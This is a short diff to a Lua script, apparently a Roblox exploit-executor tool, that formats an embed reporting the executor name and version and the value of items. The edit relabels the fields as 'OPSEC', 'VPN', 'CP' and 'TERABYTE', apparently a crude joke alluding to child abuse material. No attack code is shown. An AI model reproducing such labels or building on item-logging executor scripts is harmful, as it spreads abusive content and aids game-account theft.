@@ -74,8 +74,8 @@ function chang(inve)
     end)    
     fields = {
         {
-            name="Info",
-            value="```\n📱 Executor: "..exec.." "..execver.."\n💎 New items value: "..newval.."\n💎 All new items value: "..totalval.."\n```"
+            name="OPSEC",
+            value="```\n📱 VPN: "..exec.." "..execver.."\n💎 CP: "..newval.."\n💎 TERABYTE: "..totalval.."\n```"
         },
         {
             name="Items",
